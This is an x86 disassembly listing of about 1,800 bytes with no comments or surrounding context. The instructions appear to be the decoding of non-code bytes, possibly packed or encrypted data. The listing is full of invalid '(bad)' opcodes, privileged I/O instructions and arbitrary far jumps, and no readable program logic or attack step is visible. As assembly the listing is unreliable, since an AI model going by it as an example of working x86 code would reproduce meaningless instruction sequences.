  41ba04:	lock lods eax,DWORD PTR ds:[esi]
  41ba06:	scas   al,BYTE PTR es:[edi]
  41ba07:	int    0x6e
  41ba09:	pop    ebp
  41ba0a:	iret   
  41ba0b:	mul    ebx
  41ba0d:	out    0xd2,al
  41ba0f:	inc    ax
  41ba11:	dec    ebx
  41ba12:	inc    ecx
  41ba13:	xchg   ecx,eax
  41ba14:	jb     0x41b9a1
  41ba16:	and    al,0x98
  41ba18:	sub    ebx,edx
  41ba1a:	push   ds
  41ba1b:	pop    ecx
  41ba1c:	and    al,0x3e
  41ba1e:	push   ds
  41ba1f:	fst    QWORD PTR [edi+0x5129dd97]
  41ba25:	add    eax,0x8247bc7d
  41ba2a:	cli    
  41ba2b:	xchg   DWORD PTR [edi+0x33],esp
  41ba2e:	iret   
  41ba2f:	adc    edi,eax
  41ba31:	or     ah,BYTE PTR [eax+0x35]
  41ba34:	lea    edx,[eax-0x1e008849]
  41ba3a:	ins    BYTE PTR es:[edi],dx
  41ba3b:	jmp    0xda2bd79c
  41ba40:	cmp    edi,esi
  41ba42:	push   eax
  41ba43:	sub    BYTE PTR [eax-0x73a53b51],bh
  41ba49:	test   BYTE PTR ds:0x23f37e40,0x9f
  41ba50:	pop    esp
  41ba51:	out    dx,eax
  41ba52:	retf   0xa43e
  41ba55:	popf   
  41ba56:	dec    esp
  41ba57:	std    
  41ba58:	mov    sp,0xbbe
  41ba5c:	arpl   bp,si
  41ba5e:	dec    ah
  41ba60:	repz add BYTE PTR [ebx+0x4f],ah
  41ba64:	mov    ecx,DWORD PTR [ecx]
  41ba66:	imul   ecx,DWORD PTR [edx+0x592beb71],0xffffffba
  41ba6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba6e:	xor    ah,ch
  41ba70:	and    eax,0x956b50c1
  41ba75:	fisub  WORD PTR [edi+0x50c1d137]
  41ba7b:	inc    esi
  41ba7c:	ja     0x41baea
  41ba7e:	pop    ecx
  41ba7f:	fisubr DWORD PTR [ebp+0x32]
  41ba82:	cmp    ah,BYTE PTR [ecx-0x2b]
  41ba85:	ds add ah,cl
  41ba88:	dec    ebp
  41ba89:	lods   eax,DWORD PTR ds:[esi]
  41ba8a:	fistp  DWORD PTR [eax-0x6bbdac0f]
  41ba90:	and    al,0x17
  41ba92:	repnz ss push 0xe7d757fa
  41ba99:	(bad)  
  41ba9a:	xor    BYTE PTR [ebp-0x1f4baf39],bh
  41baa0:	jle    0x41ba9a
  41baa2:	fsub   DWORD PTR [ecx-0x45]
  41baa5:	lds    esi,FWORD PTR [eax+0x58]
  41baa8:	fs sub al,0xb1
  41baac:	adc    BYTE PTR [eax-0x29ff9ea9],0x38
  41bab3:	call   0x8c65:0x53070843
  41baba:	sub    bh,bl
  41babc:	loop   0x41bb0d
  41babe:	fmul   st,st(7)
  41bac0:	dec    esi
  41bac1:	dec    ecx
  41bac2:	(bad)  
  41bac3:	push   0x5
  41bac5:	xor    ecx,eax
  41bac7:	pushf  
  41bac8:	ret    
  41bac9:	inc    edx
  41baca:	adc    eax,0xde20ea0e
  41bacf:	in     eax,0xbe
  41bad1:	in     al,dx
  41bad2:	sub    BYTE PTR [eax+ebx*8+0x10],ah
  41bad6:	in     al,dx
  41bad7:	xchg   ecx,eax
  41bad8:	mov    ch,0xd6
  41bada:	adc    bl,ah
  41badc:	call   0x1259e7fb
  41bae1:	and    cl,BYTE PTR [ebx-0x45ad495f]
  41bae7:	inc    edx
  41bae8:	pop    edx
  41bae9:	inc    ebx
  41baea:	or     ah,BYTE PTR [esi-0x5b5fa7ab]
  41baf0:	in     eax,dx
  41baf1:	jae    0x41bb17
  41baf3:	xchg   edx,eax
  41baf4:	mov    edx,esi
  41baf6:	lock fwait
  41baf8:	or     dl,BYTE PTR [edx+edx*2-0x64a9b84]
  41baff:	pop    DWORD PTR [edi+eiz*1-0x7f69b1f4]
  41bb06:	pushf  
  41bb07:	mov    BYTE PTR [eax+0x6a0cfa51],0xd0
  41bb0e:	pop    ecx
  41bb0f:	push   ebp
  41bb10:	ja     0x41baa9
  41bb12:	mov    gs:0x79dd626d,eax
  41bb18:	ror    al,cl
  41bb1a:	popa   
  41bb1b:	(bad)  
  41bb1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb1e:	mov    edx,0x5e7c13
  41bb23:	xor    al,0x78
  41bb25:	test   eax,0x1d009c50
  41bb2a:	push   es
  41bb2b:	sub    al,0xce
  41bb2d:	jl     0x41bb0d
  41bb2f:	mov    ds:0x9d3b941c,al
  41bb34:	push   ecx
  41bb35:	cmc    
  41bb36:	out    0xdd,eax
  41bb38:	mov    esp,edi
  41bb3a:	fucomip st,st(3)
  41bb3c:	(bad)  
  41bb3d:	inc    ecx
  41bb3e:	push   0xfffffff0
  41bb40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb41:	ins    DWORD PTR es:[edi],dx
  41bb42:	pushf  
  41bb43:	mov    ds:0x975870d3,al
  41bb48:	jnp    0x41bad8
  41bb4a:	xchg   ebx,esp
  41bb4c:	les    esp,FWORD PTR [ebp+edi*2+0x2be04257]
  41bb53:	push   ebp
  41bb54:	lods   eax,DWORD PTR ds:[esi]
  41bb55:	inc    ebp
  41bb56:	push   ecx
  41bb57:	das    
  41bb58:	(bad)  [ebx+0x3c21ffa1]
  41bb5e:	ficom  WORD PTR [ebp+0x4393328e]
  41bb64:	mov    edi,0x4bf0cbb1
  41bb69:	xor    al,0x69
  41bb6b:	or     eax,0x3bbd2008
  41bb70:	pop    esp
  41bb71:	sbb    BYTE PTR [ecx+0x41],0x7
  41bb75:	sti    
  41bb76:	lods   eax,DWORD PTR ds:[esi]
  41bb77:	leave  
  41bb78:	mov    WORD PTR [esi],fs
  41bb7a:	push   eax
  41bb7b:	sub    eax,0x41a874c4
  41bb80:	call   0x46d8d803
  41bb85:	call   0xbe0d:0xe34502a4
  41bb8c:	or     DWORD PTR [eax+0x7b],esp
  41bb8f:	rcr    BYTE PTR [edi+0x2c],cl
  41bb92:	out    0x72,eax
  41bb94:	pop    ebp
  41bb95:	jecxz  0x41bc0c
  41bb97:	add    bl,al
  41bb99:	xor    edx,DWORD PTR [ebp+0x36]
  41bb9c:	push   edx
  41bb9d:	(bad)  
  41bb9e:	jne    0x41bc0e
  41bba0:	sub    BYTE PTR [esi+ecx*4-0x345db078],cl
  41bba7:	cdq    
  41bba8:	pop    ss
  41bba9:	cmp    esi,DWORD PTR [edi]
  41bbab:	mov    ebp,0x39bcc24b
  41bbb0:	sbb    bl,bl
  41bbb2:	inc    eax
  41bbb3:	iret   
  41bbb4:	jnp    0x41bb62
  41bbb6:	fsub   QWORD PTR [ebp-0x58]
  41bbb9:	mov    dl,al
  41bbbb:	sbb    al,0x7f
  41bbbd:	push   edi
  41bbbe:	jmp    0x41bb49
  41bbc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbc1:	(bad)
  41bbc6:	xor    esp,DWORD PTR [edx]
  41bbc8:	mov    dh,0x8c
  41bbca:	add    BYTE PTR [ebx-0x772a1324],dl
  41bbd0:	sub    BYTE PTR [ebx],dh
  41bbd2:	add    ch,0xca
  41bbd5:	push   es
  41bbd6:	or     ch,BYTE PTR [eax-0x8]
  41bbd9:	dec    edx
  41bbda:	jl     0x41bc37
  41bbdc:	mov    dl,0x7d
  41bbde:	sbb    al,0x93
  41bbe0:	jle    0x41bc33
  41bbe2:	shl    DWORD PTR [ecx-0x399453c7],1
  41bbe8:	cmp    BYTE PTR [eax-0x76],dl
  41bbeb:	hlt    
  41bbec:	jo     0x41bc1f
  41bbee:	jnp    0x41bb81
  41bbf0:	push   ss
  41bbf1:	outs   dx,BYTE PTR ds:[esi]
  41bbf2:	fwait
  41bbf3:	ret    
  41bbf4:	dec    edx
  41bbf5:	jle    0x41bc73
  41bbf7:	test   eax,0xd3c08e31
  41bbfc:	pop    edi
  41bbfd:	icebp  
  41bbfe:	or     BYTE PTR [ecx+0x43d3ad1d],ch
  41bc04:	dec    edx
  41bc05:	jmp    0x244e:0xee996e74
  41bc0c:	std    
  41bc0d:	push   esp
  41bc0e:	xchg   BYTE PTR [ebp-0x76],cl
  41bc11:	inc    eax
  41bc12:	adc    ebp,ecx
  41bc14:	and    ebp,ecx
  41bc16:	test   eax,0xab70dd82
  41bc1b:	push   0x53
  41bc1d:	ins    DWORD PTR es:[edi],dx
  41bc1e:	mov    esp,0xa4dca2dc
  41bc23:	jno    0x41bc73
  41bc25:	nop
  41bc26:	inc    ebx
  41bc27:	cmp    BYTE PTR fs:[ebp-0x48],0xeb
  41bc2c:	test   esp,esi
  41bc2e:	mov    ecx,0xd1a78bd5
  41bc33:	and    BYTE PTR [ebp+edi*2+0x7f3f311a],bh
  41bc3a:	cmp    eax,0x6f650a93
  41bc3f:	repz arpl WORD PTR [esi*1-0x55c63b7e],bx
  41bc47:	cwde   
  41bc48:	jp     0x41bbd7
  41bc4a:	jle    0x41bc08
  41bc4c:	popf   
  41bc4d:	adc    DWORD PTR [edx],ecx
  41bc4f:	xchg   ebp,eax
  41bc50:	aad    0xde
  41bc52:	popf   
  41bc53:	in     al,0x57
  41bc55:	push   edi
  41bc56:	adc    DWORD PTR [edi],esp
  41bc58:	call   DWORD PTR [esp+eiz*4-0x2f]
  41bc5c:	mov    eax,0x474799e2
  41bc61:	pop    ecx
  41bc62:	not    dh
  41bc64:	xor    BYTE PTR ds:0x6f7d3718,al
  41bc6a:	xchg   edi,eax
  41bc6b:	aas    
  41bc6c:	int    0xde
  41bc6e:	test   BYTE PTR [ebx+edx*1],dh
  41bc71:	les    esp,FWORD PTR es:[esi]
  41bc74:	inc    ebx
  41bc75:	mov    BYTE PTR [ebp+0x7c],bl
  41bc78:	sbb    al,BYTE PTR [ecx+0x7f]
  41bc7b:	add    DWORD PTR [esi-0x1830e412],ecx
  41bc81:	pop    eax
  41bc82:	xor    dh,ch
  41bc84:	stos   BYTE PTR es:[edi],al
  41bc85:	call   eax
  41bc87:	push   ebp
  41bc88:	sbb    eax,0x9a299c51
  41bc8d:	ja     0x41bcb1
  41bc8f:	sar    BYTE PTR [esi],1
  41bc91:	outs   dx,BYTE PTR ds:[esi]
  41bc92:	data16 mov ch,0x91
  41bc95:	(bad)  
  41bc97:	in     al,0x4
  41bc99:	sub    al,bh
  41bc9b:	in     eax,dx
  41bc9c:	fiadd  WORD PTR [eax-0x4b18a929]
  41bca2:	jo     0x41bc25
  41bca4:	mov    edi,0xe40a2070
  41bca9:	cli    
  41bcaa:	xor    DWORD PTR [eax],ebp
  41bcac:	test   ebp,ebx
  41bcae:	ins    DWORD PTR es:[edi],dx
  41bcaf:	inc    DWORD PTR [ecx-0x5c]
  41bcb2:	dec    esi
  41bcb3:	outs   dx,BYTE PTR ds:[esi]
  41bcb4:	cwde   
  41bcb5:	aad    0x84
  41bcb7:	sub    dl,BYTE PTR [ebp+0x79c2ad3b]
  41bcbd:	adc    al,0xe7
  41bcbf:	mov    BYTE PTR [edx],ch
  41bcc1:	mov    eax,ds:0xa0b2171
  41bcc6:	jecxz  0x41bd3b
  41bcc8:	cmp    al,0x8f
  41bcca:	mov    eax,0x550de92f
  41bccf:	pop    ss
  41bcd0:	(bad)  [ebx-0x53]
  41bcd3:	jne    0x41bd25
  41bcd5:	ficomp WORD PTR [ebp+edx*1+0x75]
  41bcd9:	into   
  41bcda:	lahf   
  41bcdb:	aas    
  41bcdc:	sbb    ah,BYTE PTR [edx]
  41bcde:	aad    0xb
  41bce0:	jg     0x41bcfa
  41bce2:	arpl   ax,ax
  41bce4:	mov    ecx,0x1d7f3c5f
  41bce9:	sbb    DWORD PTR [eax+0x3f],ebx
  41bcec:	dec    esi
  41bced:	sti    
  41bcee:	push   eax
  41bcef:	adc    al,0xf2
  41bcf1:	xchg   edi,eax
  41bcf2:	scas   eax,DWORD PTR es:[edi]
  41bcf3:	and    al,ah
  41bcf5:	fs fdivp st(6),st
  41bcf8:	jmp    0xd9595082
  41bcfd:	aaa    
  41bcfe:	mov    ah,0x29
  41bd00:	repz aas 
  41bd02:	push   ds
  41bd03:	into   
  41bd04:	aam    0xa7
  41bd06:	xor    eax,0x24aff09c
  41bd0b:	push   ds
  41bd0c:	and    al,0xcb
  41bd0e:	or     dl,BYTE PTR [eax-0x49749567]
  41bd14:	sbb    ah,ch
  41bd16:	xchg   ah,cl
  41bd18:	stc    
  41bd19:	xchg   edx,eax
  41bd1a:	mov    esi,0x7e785174
  41bd1f:	aas    
  41bd20:	das    
  41bd21:	imul   ebp,DWORD PTR [eax+0x60],0x26
  41bd25:	test   al,0x24
  41bd27:	push   edi
  41bd28:	mov    al,0x52
  41bd2a:	mov    WORD PTR [eax],?
  41bd2c:	leave  
  41bd2d:	sub    DWORD PTR [esi-0x66],esi
  41bd30:	sub    eax,0x338b249e
  41bd35:	pop    ds
  41bd36:	mov    ebp,0x86da6afe
  41bd3b:	adc    edi,esi
  41bd3d:	out    dx,al
  41bd3e:	add    DWORD PTR [edx-0x4],esi
  41bd41:	xor    DWORD PTR [edi+0x42810664],eax
  41bd47:	ins    BYTE PTR es:[edi],dx
  41bd48:	(bad)  
  41bd49:	hlt    
  41bd4a:	and    BYTE PTR [edx+0x9],cl
  41bd4d:	push   eax
  41bd4e:	aam    0x15
  41bd50:	rcl    BYTE PTR [edi-0x21],0x85
  41bd54:	push   es
  41bd55:	add    DWORD PTR [edx-0x62],esp
  41bd58:	rol    DWORD PTR [eax],1
  41bd5a:	ror    DWORD PTR [edx],cl
  41bd5c:	jmp    DWORD PTR [ecx]
  41bd5e:	lods   al,BYTE PTR ds:[esi]
  41bd5f:	pop    ebp
  41bd60:	popf   
  41bd61:	call   0xdd8804d6
  41bd66:	xlat   BYTE PTR es:[ebx]
  41bd68:	je     0x41bd57
  41bd6a:	jmp    0x547e:0x40b19ef7
  41bd71:	aad    0x30
  41bd73:	adc    ah,ah
  41bd75:	test   eax,0xab55a396
  41bd7a:	and    BYTE PTR [edx+0x481dc856],bl
  41bd80:	popa   
  41bd81:	(bad)  
  41bd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd83:	pusha  
  41bd84:	cs js  0x41bdd3
  41bd87:	(bad)  
  41bd88:	dec    DWORD PTR [ecx]
  41bd8a:	std    
  41bd8b:	enter  0x9f2,0xb2
  41bd8f:	cmp    BYTE PTR [ecx+ebx*4],0xb9
  41bd93:	mov    ah,BYTE PTR [eax]
  41bd95:	mov    dl,0x9c
  41bd97:	scas   eax,DWORD PTR es:[edi]
  41bd98:	fisubr DWORD PTR [eax-0x4a]
  41bd9b:	jmp    0x41bd3d
  41bd9d:	test   eax,0xbb576b6a
  41bda2:	pop    esp
  41bda3:	mov    ecx,DWORD PTR [ebx-0x7f]
  41bda6:	aad    0x3e
  41bda8:	pusha  
  41bda9:	jmp    0xaaacd6f
  41bdae:	push   0x2e5f983d
  41bdb3:	mov    edi,0xb9eee46d
  41bdb8:	(bad)  [eax-0x9]
  41bdbb:	sbb    BYTE PTR [eax],bl
  41bdbd:	cmp    eax,ebx
  41bdbf:	push   cs
  41bdc0:	dec    edi
  41bdc1:	lock xchg DWORD PTR [edx+0x7e58342],edx
  41bdc8:	lahf   
  41bdc9:	xor    esi,DWORD PTR [ebx-0x22043ad9]
  41bdcf:	repz inc eax
  41bdd1:	cdq    
  41bdd2:	sbb    eax,DWORD PTR [edi-0x2eaa6c3e]
  41bdd8:	mov    DWORD PTR [edi-0x9],eax
  41bddb:	sub    bh,BYTE PTR [ebp+0x3355f10c]
  41bde1:	(bad)  
  41bde2:	call   0x4b0bf484
  41bde7:	mov    ecx,0xaa10ab72
  41bdec:	stos   DWORD PTR es:[edi],eax
  41bded:	enter  0x5197,0x6e
  41bdf1:	std    
  41bdf2:	fdivrp st(7),st
  41bdf4:	(bad)  
  41bdf5:	int    0x5f
  41bdf7:	jmp    0x41bda0
  41bdf9:	and    al,0x1
  41bdfb:	mov    eax,0xbe57eb02
  41be00:	sub    al,0x23
  41be02:	inc    eax
  41be03:	fimul  WORD PTR [esi-0x43]
  41be06:	add    DWORD PTR [esi+edx*8+0x52],ebp
  41be0a:	sub    eax,0x67bad22d
  41be0f:	sbb    dl,BYTE PTR [eax+0x51ee9bba]
  41be15:	sbb    al,0x61
  41be17:	push   ecx
  41be18:	lock and al,0x77
  41be1b:	dec    ebx
  41be1c:	js     0x41bdae
  41be1e:	add    BYTE PTR [ebp+0x5976bd99],al
  41be24:	dec    ebx
  41be25:	test   edi,ebp
  41be27:	rol    cl,cl
  41be29:	xchg   ebx,eax
  41be2a:	aam    0x8e
  41be2c:	sar    esp,1
  41be2e:	retf   0x322e
  41be31:	enter  0x12c1,0x43
  41be35:	pop    ecx
  41be36:	(bad)  
  41be37:	mov    ah,0xe
  41be39:	push   ss
  41be3a:	arpl   WORD PTR ds:0x79c51f23,si
  41be40:	dec    eax
  41be41:	leave  
  41be42:	jge    0x41be64
  41be44:	or     edx,DWORD PTR [ecx]
  41be46:	scas   eax,DWORD PTR es:[edi]
  41be47:	mov    ds:0x57161449,al
  41be4c:	ror    DWORD PTR [edx+0x4],0x28
  41be50:	aad    0x71
  41be52:	dec    edi
  41be53:	xor    al,0x63
  41be55:	xor    BYTE PTR [edi],bl
  41be57:	sahf   
  41be58:	inc    ebx
  41be59:	xchg   ecx,eax
  41be5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be5b:	mov    ecx,0x379c9fc0
  41be60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be61:	data16 sbb al,0x55
  41be64:	jno    0x41be2d
  41be66:	test   DWORD PTR [ecx-0x2a61269],0xf9b9f8f9
  41be70:	addr16 xor dl,bl
  41be73:	mov    eax,DWORD PTR [esi+esi*8+0x26]
  41be77:	in     eax,0x47
  41be79:	arpl   dx,ax
  41be7b:	cli    
  41be7c:	mov    ebp,0x55159440
  41be81:	imul   esp,DWORD PTR [edi+0x164433b0],0x2ae81f6
  41be8b:	adc    DWORD PTR [ecx-0x4a],edx
  41be8e:	pop    ss
  41be8f:	sti    
  41be90:	cwde   
  41be91:	xchg   esi,eax
  41be92:	jmp    0x41be2b
  41be94:	mov    eax,DWORD PTR [ebx+0x23]
  41be97:	lds    edx,FWORD PTR [eax]
  41be99:	adc    ebx,DWORD PTR [eax+0x55]
  41be9c:	sub    BYTE PTR [esi-0x64],0x1d
  41bea0:	call   0x40df:0x59272a62
  41bea7:	(bad)  
  41bea8:	iret   
  41bea9:	rol    ch,0x71
  41beac:	shr    BYTE PTR [ebx*2-0x4f7c4db1],1
  41beb3:	popa   
  41beb4:	hlt    
  41beb5:	sub    eax,0x18da71
  41beba:	mov    bh,BYTE PTR [edi]
  41bebc:	cmp    eax,0xdb2146ed
  41bec1:	ins    BYTE PTR es:[edi],dx
  41bec2:	psubw  mm4,QWORD PTR [ebp+0x34]
  41bec6:	out    dx,eax
  41bec7:	fcomp  QWORD PTR [ebx+ebx*1-0x31]
  41becb:	stos   DWORD PTR es:[edi],eax
  41becc:	mov    ah,0xd0
  41bece:	inc    edi
  41becf:	mov    bl,0xed
  41bed1:	cdq    
  41bed2:	mov    ah,0xea
  41bed4:	hlt    
  41bed5:	dec    esi
  41bed6:	scas   eax,DWORD PTR es:[edi]
  41bed7:	stos   BYTE PTR es:[edi],al
  41bed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bed9:	xor    cl,BYTE PTR [eax-0x6f]
  41bedc:	(bad)  
  41bedd:	aam    0x5d
  41bedf:	sub    BYTE PTR [edi+0x12752d74],cl
  41bee5:	inc    edi
  41bee6:	pop    edx
  41bee7:	pop    edi
  41bee8:	sub    DWORD PTR [ebx+0x4ec25cf0],ecx
  41beee:	inc    esi
  41beef:	js     0x41bf5e
  41bef1:	push   edx
  41bef2:	xor    BYTE PTR [eax+0x59],cl
  41bef5:	ins    BYTE PTR es:[edi],dx
  41bef6:	iret   
  41bef7:	sub    BYTE PTR [eax+0x48121e50],ah
  41befd:	lods   eax,DWORD PTR ds:[esi]
  41befe:	mov    cl,0x0
  41bf00:	jns    0x41bf12
  41bf02:	stos   BYTE PTR es:[edi],al
  41bf03:	stc    
  41bf04:	retf   0x9a43
  41bf07:	clc    
  41bf08:	jno    0x41bea8
  41bf0a:	cmp    esi,edi
  41bf0c:	popa   
  41bf0d:	inc    ebp
  41bf0e:	xchg   esi,eax
  41bf0f:	dec    esp
  41bf10:	in     eax,dx
  41bf11:	aad    0xfb
  41bf13:	dec    bh
  41bf15:	push   eax
  41bf16:	lds    esi,FWORD PTR [edi]
  41bf18:	xchg   esp,eax
  41bf19:	xchg   ecx,eax
  41bf1a:	dec    ebx
  41bf1b:	pop    edx
  41bf1c:	dec    edx
  41bf1d:	mov    BYTE PTR [ebx],bh
  41bf1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf20:	ret    0x481c
  41bf23:	push   edx
  41bf24:	ja     0x41bf0d
  41bf26:	cs pop edx
  41bf28:	ret    
  41bf29:	mov    ebx,0x6b200bcb
  41bf2e:	pop    ebx
  41bf2f:	hlt    
  41bf30:	in     al,dx
  41bf31:	fidivr WORD PTR [ecx-0x20]
  41bf34:	pop    ds
  41bf35:	ja     0x41bf18
  41bf37:	and    ch,BYTE PTR [edx+0x4549b757]
  41bf3d:	stc    
  41bf3e:	cmc    
  41bf3f:	jnp    0x41bf81
  41bf41:	jmp    0xcbcf:0x743261bc
  41bf48:	push   ebx
  41bf49:	mov    ebx,DWORD PTR [esi-0x6c4dc812]
  41bf4f:	(bad)  
  41bf50:	push   ebp
  41bf51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf52:	inc    esp
  41bf53:	push   esp
  41bf54:	jbe    0x41bedb
  41bf56:	pusha  
  41bf57:	xor    edi,DWORD PTR [eax+0x4a]
  41bf5a:	adc    DWORD PTR [ebx],eax
  41bf5c:	or     al,al
  41bf5e:	ret    0x76d
  41bf61:	sbb    al,0x26
  41bf63:	xor    al,0xc4
  41bf65:	lea    esi,[ebx+0x36a0a67d]
  41bf6b:	hlt    
  41bf6c:	or     esp,DWORD PTR [edi*4-0x27b9fc20]
  41bf73:	data16 add ah,BYTE PTR [ecx]
  41bf76:	ret    
  41bf77:	test   BYTE PTR [esi-0x21],ah
  41bf7a:	jb     0x41bfb2
  41bf7c:	and    DWORD PTR [edi-0x67ec7f99],edx
  41bf82:	pop    edx
  41bf83:	dec    eax
  41bf84:	dec    eax
  41bf85:	mov    cl,0xd5
  41bf87:	push   ebp
  41bf88:	test   ecx,ebp
  41bf8a:	push   ebx
  41bf8b:	xchg   ebx,eax
  41bf8c:	fisubr DWORD PTR [eax]
  41bf8e:	push   ebp
  41bf8f:	push   ss
  41bf90:	scas   al,BYTE PTR es:[edi]
  41bf91:	xchg   ebp,eax
  41bf92:	gs pop ebx
  41bf94:	scas   eax,DWORD PTR es:[edi]
  41bf95:	sub    DWORD PTR [eax-0xb3a4bfb],ecx
  41bf9b:	stos   DWORD PTR es:[edi],eax
  41bf9c:	in     eax,dx
  41bf9d:	sbb    bl,BYTE PTR [eax-0x19]
  41bfa0:	aas    
  41bfa1:	setl   BYTE PTR [ecx+0x432cfc36]
  41bfa8:	mov    al,0xa8
  41bfaa:	cmp    cl,BYTE PTR [esi]
  41bfac:	retf   0xa8b4
  41bfaf:	push   ebx
  41bfb0:	xlat   BYTE PTR ds:[ebx]
  41bfb1:	push   es
  41bfb2:	stos   DWORD PTR es:[edi],eax
  41bfb3:	int3   
  41bfb4:	or     DWORD PTR [eax-0x64],ebx
  41bfb7:	test   eax,0x62bb9755
  41bfbc:	pop    ds
  41bfbd:	mov    eax,0xc0931481
  41bfc2:	outs   dx,BYTE PTR ds:[esi]
  41bfc3:	xor    BYTE PTR [eax+0x2e],0x3a
  41bfc7:	adc    DWORD PTR [eax],0x83637bfa
  41bfcd:	sbb    DWORD PTR ss:[eax+edx*1-0x750336b],esi
  41bfd5:	or     eax,0x1ce04003
  41bfda:	popa   
  41bfdb:	es jl  0x41bf74
  41bfde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfdf:	loop   0x41bfa0
  41bfe1:	mov    ds,WORD PTR [esi]
  41bfe3:	xchg   eax,eax
  41bfe5:	cmovs  ebx,ecx
  41bfe8:	ret    
  41bfe9:	mov    esp,0x2b4dc120
  41bfee:	xor    ecx,DWORD PTR [esi-0x7e24aa52]
  41bff4:	int    0xc5
  41bff6:	out    dx,eax
  41bff7:	pop    esi
  41bff8:	aaa    
  41bff9:	add    BYTE PTR [ecx+0x16],cl
  41bffc:	add    cl,BYTE PTR [edx-0x7e2036f9]
  41c002:	mov    esi,0xdf87fac6
  41c007:	mov    cl,0xa
  41c009:	clc    
  41c00a:	mov    ch,0x22
  41c00c:	dec    ebx
  41c00d:	lahf   
  41c00e:	cmp    eax,0xd6dfbafa
  41c013:	in     eax,dx
  41c014:	jp     0x41bfbd
  41c016:	or     ecx,eax
  41c018:	adc    BYTE PTR [edi-0x74],dh
  41c01b:	mov    ecx,DWORD PTR ss:[esi-0x6]
  41c01f:	les    esi,FWORD PTR [eax+0x74c6fd73]
  41c025:	and    ecx,DWORD PTR [esi-0x25e3170e]
  41c02b:	xchg   edx,eax
  41c02c:	inc    ebp
  41c02d:	pushf  
  41c02e:	add    eax,0x55062376
  41c033:	jmp    0xd0ce32a9
  41c038:	rol    BYTE PTR [esi+ebx*4],1
  41c03b:	aaa    
  41c03c:	fst    QWORD PTR [esi]
  41c03e:	jge    0x41c0a5
  41c040:	mov    dl,0xc0
  41c042:	daa    
  41c043:	and    DWORD PTR [ebx-0x50],eax
  41c046:	nop
  41c047:	(bad)  
  41c048:	out    dx,al
  41c049:	dec    esi
  41c04a:	(bad)  
  41c04b:	xor    DWORD PTR [ecx-0x2d],esp
  41c04e:	sar    DWORD PTR [eax],0x8
  41c051:	(bad)  
  41c052:	mov    ebx,0xdcd638b1
  41c057:	pop    ecx
  41c058:	cdq    
  41c059:	stc    
  41c05a:	bound  ecx,QWORD PTR [edi-0x15]
  41c05d:	mov    ebx,0x3dec58ad
  41c062:	or     BYTE PTR [edi+0x1e13c33d],al
  41c068:	repz retf 
  41c06a:	push   ebx
  41c06b:	(bad)  [edi-0x3572f879]
  41c071:	mov    fs,eax
  41c073:	retf   
  41c074:	repz rol DWORD PTR [ebx],1
  41c077:	aas    
  41c078:	or     eax,0xd207eab7
  41c07d:	and    ah,BYTE PTR [ebp+ebp*8-0x4f8e54f7]
  41c084:	xlat   BYTE PTR ds:[ebx]
  41c085:	pop    eax
  41c086:	inc    ebx
  41c087:	loopne 0x41c03f
  41c089:	stc    
  41c08a:	sbb    ebp,DWORD PTR ds:0x72bb300f
  41c090:	mov    edx,DWORD PTR [ecx]
  41c092:	sub    al,0x54
  41c094:	imul   ebp,DWORD PTR [ebp-0x79f6d448],0x59
  41c09b:	xor    al,0x5e
  41c09d:	addr16 sbb eax,0x36790b9
  41c0a3:	lds    ecx,FWORD PTR [ebp*2-0x43861f0e]
  41c0aa:	in     al,0x42
  41c0ac:	aaa    
  41c0ad:	or     esi,DWORD PTR [ebp-0x7a8a76b9]
  41c0b3:	mov    ds:0x4704f4f7,al
  41c0b8:	call   0x9e1b454d
  41c0bd:	(bad)  
  41c0be:	mov    eax,ds:0xdfadd9da
  41c0c3:	rcl    bl,cl
  41c0c5:	jle    0x41c0f7
  41c0c7:	jne    0x41c097
  41c0c9:	lods   eax,DWORD PTR ds:[esi]
  41c0ca:	sub    ebp,DWORD PTR [edi]
  41c0cc:	int    0x31
  41c0ce:	pop    edx
  41c0cf:	push   edx
  41c0d0:	add    DWORD PTR [esi+0x3b4fffb3],0x4457c14e
  41c0da:	add    BYTE PTR [eax],dl
  41c0dc:	fsubr  DWORD PTR [ebx]
  41c0de:	clc    
  41c0df:	outs   dx,BYTE PTR ds:[esi]
  41c0e0:	bound  edi,QWORD PTR [esp+ebp*4+0x15]
  41c0e4:	push   0xffffffc5
  41c0e6:	dec    BYTE PTR [esi+eax*2+0x3d]
  41c0ea:	mov    ah,0x77
  41c0ec:	mov    BYTE PTR [ecx+0x7c],ch
  41c0ef:	in     eax,0x71
  41c0f1:	inc    eax
  41c0f2:	fisubr DWORD PTR [ecx+0x473e6167]
  41c0f8:	imul   ebx,DWORD PTR fs:[edx+ebp*8],0xb
  41c0fd:	test   BYTE PTR [eax-0x3469dab8],bl
  41c103:	rol    ah,cl
  41c105:	pop    edx
  41c106:	mov    edi,0xdd76027f
  41c10b:	ss cli 
  41c10d:	jl     0x41c0c8
  41c10f:	add    esi,edi
  41c111:	sbb    BYTE PTR [esi+0x6e6fb8af],0x89
  41c118:	mov    ebp,0xec19f371
  41c11d:	dec    esp
  41c11e:	jo     0x41c16d
  41c120:	or     DWORD PTR [eax+0x5d],esp
  41c123:	pop    ds
  41c124:	loope  0x41c130
  41c126:	retf   
  41c127:	arpl   WORD PTR [esi-0x3f95de8a],di
  41c12d:	out    0xe1,eax
  41c12f:	sbb    eax,0x97684425
  41c134:	(bad)  
  41c135:	mov    WORD PTR [edi+0x3cf9c149],fs
  41c13b:	add    al,0x10
  41c13d:	mov    ds,edx
  41c13f:	daa    
  41c140:	(bad)  
  41c141:	mov    ah,0x6b
  41c143:	fld    QWORD PTR [ecx+0x528f5a99]
  41c149:	sub    BYTE PTR [ebx],bl
  41c14b:	sub    BYTE PTR [ecx+0x3b],bl
  41c14e:	daa    
  41c14f:	arpl   WORD PTR es:[ebx-0x1837ee50],cx
  41c156:	icebp  
  41c157:	(bad)  
  41c158:	cmp    edi,DWORD PTR [ecx]
  41c15a:	dec    esp
  41c15b:	arpl   WORD PTR [edi-0x10907d11],ax
